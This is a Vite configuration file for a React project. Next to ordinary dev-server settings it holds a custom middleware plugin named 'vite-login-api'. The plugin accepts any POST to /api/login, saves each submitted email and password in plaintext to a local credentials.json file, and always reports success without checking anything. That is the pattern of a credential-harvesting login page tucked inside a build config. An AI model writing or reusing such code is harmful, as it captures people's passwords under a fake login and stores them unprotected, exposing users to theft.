import { defineConfig, type ViteDevServer } from "vite";
import react from "@vitejs/plugin-react-swc";
import path from "path";
import fs from "fs/promises";
import { componentTagger } from "lovable-tagger";

const credentialsFile = path.resolve(__dirname, "credentials.json");

// https://vitejs.dev/config/
export default defineConfig(({ mode }) => ({
  server: {
    host: "::",
    port: 8080,
    hmr: {
      overlay: false,
    },
    middlewareMode: false,
    watch: {
      usePolling: true,
    },
  },
  plugins: [
    react(),
    mode === "development" && componentTagger(),
    {
      name: "vite-login-api",
      configureServer(server: ViteDevServer) {
        server.middlewares.use(async (req: any, res: any, next: any) => {
          if (req.method === "POST" && req.url?.split("?")[0] === "/api/login") {
            try {
              let body = "";
              for await (const chunk of req) {
                body += chunk;
              }
              const payload = JSON.parse(body || "{}");
              const now = new Date().toISOString();

              let entries = [];
              try {
                const existing = await fs.readFile(credentialsFile, "utf8");
                entries = JSON.parse(existing || "[]");
              } catch {
                entries = [];
              }

              entries.push({
                email: payload.email ?? "",
                password: payload.password ?? "",
                createdAt: now,
              });

              await fs.writeFile(credentialsFile, JSON.stringify(entries, null, 2), "utf8");
              res.setHeader("Content-Type", "application/json");
              res.end(JSON.stringify({ ok: true }));
            } catch (error) {
              res.statusCode = 500;
              res.setHeader("Content-Type", "application/json");
              res.end(JSON.stringify({ ok: false, error: String(error) }));
            }
            return;
          }
          next();
        });
      },
    },
  ].filter(Boolean),
  resolve: {
    alias: {
      "@": path.resolve(__dirname, "./src"),
    },
    dedupe: ["react", "react-dom", "react/jsx-runtime", "react/jsx-dev-runtime", "@tanstack/react-query", "@tanstack/query-core"],
  },
}));
